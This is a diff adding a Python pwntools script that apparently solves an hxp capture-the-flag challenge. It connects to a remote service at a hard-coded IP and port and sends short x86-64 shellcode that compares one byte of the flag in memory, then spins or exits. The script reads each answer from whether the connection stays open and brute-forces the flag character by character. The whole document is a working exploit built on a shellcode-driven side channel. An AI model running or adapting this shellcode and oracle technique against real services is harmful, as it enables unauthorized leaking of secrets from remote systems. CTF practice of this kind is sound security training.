@@ -1,0 +1,42 @@
+#!/usr/bin/python
+from pwn import *
+from string import printable
+
+'''
+syscall;
+cmp byte ptr [rcx + 7], 0xff
+jz $-2
+'''
+
+context.log_level='warn'
+context.terminal='/usr/bin/zsh'
+
+shellcode="\x0F\x05\x80\x79\x07{}\x74\xFE"
+
+
+def check(char, index):
+    p=remote('195.201.127.119', 8664)
+    p.recvuntil('?')
+    p.sendline(str(index))
+    p.recvline()
+    time.sleep(0.2)
+    p.sendline(shellcode.format(char).ljust(9, ' '))
+    time.sleep(0.4)
+    if p.connected():
+        p.close()
+        return True
+    p.close()
+    return False
+
+
+flag='hxp{'
+for i in range(len(flag),58):
+    for k in printable:
+        if check(k, i):
+            flag+=k
+            print(flag)
+            break
+    else:
+        print('ERROR')
+        break
+
